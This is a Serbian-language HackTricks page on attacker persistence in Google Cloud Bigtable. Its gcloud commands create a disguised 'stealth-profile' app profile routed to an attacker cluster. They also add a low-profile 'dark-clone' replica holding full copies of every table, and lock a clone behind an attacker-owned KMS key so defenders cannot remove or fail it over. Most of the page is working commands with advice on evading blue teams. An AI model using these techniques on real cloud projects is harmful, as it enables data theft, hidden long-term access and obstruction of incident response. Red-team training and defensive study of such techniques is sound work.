# GCP - Bigtable Perzistencija

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Za više informacija o Bigtable pogledajte:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Posvećeni App Profile za napadača

**Dozvole:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Kreirajte app profile koji usmerava saobraćaj ka vašem klasteru replika i omogućite Data Boost, tako da ne zavisite od dodeljenih čvorova koje odbrambeni tim može primetiti.
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
Sve dok taj profil postoji, možete se ponovo povezati koristeći nove kredencijale koji ga referenciraju.

### Održavajte sopstveni replika klaster

**Dozvole:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Postavite klaster sa minimalnim brojem čvorova u mirnoj regiji. Čak i ako vaši identiteti klijenata nestanu, **klaster čuva punu kopiju svake tabele** dok ga odbrambeni tim eksplicitno ne ukloni.
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
Pratite ga pomoću `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` kako biste mogli odmah povećati kapacitet kada treba da preuzmete podatke.

### Zaključajte replikaciju iza sopstvenog CMEK-a

**Dozvole:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` on the attacker-owned key.

Koristite sopstveni KMS ključ prilikom podizanja klona. Bez tog ključa, Google ne može ponovo kreirati ili fail over klaster, pa blue teams moraju da se koordiniraju s vama pre nego što ga dodirnu.
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
Rotirajte ili onemogućite ključ u svom projektu da odmah brick-ujete repliku (a da je ipak kasnije možete ponovo uključiti).

{{#include ../../../banners/hacktricks-training.md}}
